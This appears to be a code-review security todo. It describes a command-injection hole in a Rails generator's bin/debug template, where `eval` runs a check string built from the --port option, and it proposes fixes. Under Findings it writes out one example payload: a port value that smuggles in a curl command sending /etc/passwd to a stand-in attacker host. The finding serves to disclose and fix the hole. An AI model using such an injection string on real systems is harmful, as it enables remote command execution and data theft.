---
status: pending
priority: p1
issue_id: "003"
tags: [code-review, security, command-injection]
dependencies: []
---

# 003 — eval "$check" in bin_debug.tt Enables Command Injection via --port Argument

## Problem Statement

The `wait_for` function in the generated `bin/debug` script uses `eval "$check"` to execute its readiness check. The `$check` value at the call site includes `<%= port %>` — the port number interpolated from the generator's `--port` option. A `--port` argument containing shell metacharacters will embed executable shell code in the generated script.

**Why it matters:** Any CI pipeline that forwards user-provided input to `rails g debug_anywhere:install --port=<value>` is a command injection vector. The generated script is committed to the repository and executed on developer machines.

## Findings

File: `lib/generators/debug_anywhere/templates/bin_debug.tt`, line 10
```bash
until eval "$check"; do
```

Call sites:
```bash
wait_for "debug port <%= port %>" "nc -z localhost <%= port %> 2>/dev/null"
wait_for "web server"             "curl -sf http://localhost:3000/up > /dev/null 2>&1"
```

Attack vector: `rails g debug_anywhere:install --port="12345; curl http://evil.example/exfil?h=$(cat /etc/passwd) #"` embeds the shell payload verbatim into the nc invocation, which `eval` then executes.

The port is also not validated against a valid range (1024–65535) — see todo 009.

## Proposed Solutions

### Option A: Replace eval with direct command invocation (Recommended)
Since both check commands are known at generation time, replace the generic `eval "$check"` with specialized wait functions:

```bash
wait_for_port() {
  local port=$1
  echo -n "Waiting for debug port $port"
  local attempts=0
  until nc -z localhost "$port" 2>/dev/null; do
    echo -n "."; sleep 1
    attempts=$((attempts + 1))
    [ $attempts -ge 30 ] && { echo ""; echo "ERROR: port $port not ready after 30s"; exit 1; }
  done
  echo " ready!"
}

wait_for_web() {
  echo -n "Waiting for web server"
  local attempts=0
  until curl -sf http://localhost:3000/up > /dev/null 2>&1; do
    echo -n "."; sleep 1
    attempts=$((attempts + 1))
    [ $attempts -ge 30 ] && { echo ""; echo "ERROR: web server not ready after 30s"; exit 1; }
  done
  echo " ready!"
}
```

- **Pros:** Eliminates eval entirely; arguments are never interpreted as shell code
- **Cons:** Slightly more lines; loses the generic `wait_for` abstraction
- **Effort:** Small
- **Risk:** Low

### Option B: Validate --port at generator time and sanitize into script
Add port validation in `install_generator.rb` (see todo 009) so only integers 1024–65535 are accepted, making injection via --port impossible.

- **Pros:** Keeps the generic wait_for; fixes root cause
- **Cons:** Does not fix the eval pattern itself — future callers of wait_for could still pass tainted values
- **Effort:** Small
- **Risk:** Low (defense in depth, not sole fix)

## Recommended Action

Both Option A and Option B — eliminate eval and validate port independently.

## Technical Details

- **Affected files:** `lib/generators/debug_anywhere/templates/bin_debug.tt`, lines 6–20

## Acceptance Criteria

- [ ] Generated `bin/debug` contains no `eval` call
- [ ] Port readiness check uses nc with the port as a direct argument, not via eval
- [ ] A --port value with shell metacharacters is rejected at generator time with a clear error message
- [ ] Existing tests for bin/debug content pass

## Work Log

- 2026-03-17: Identified by security-sentinel as P1-01
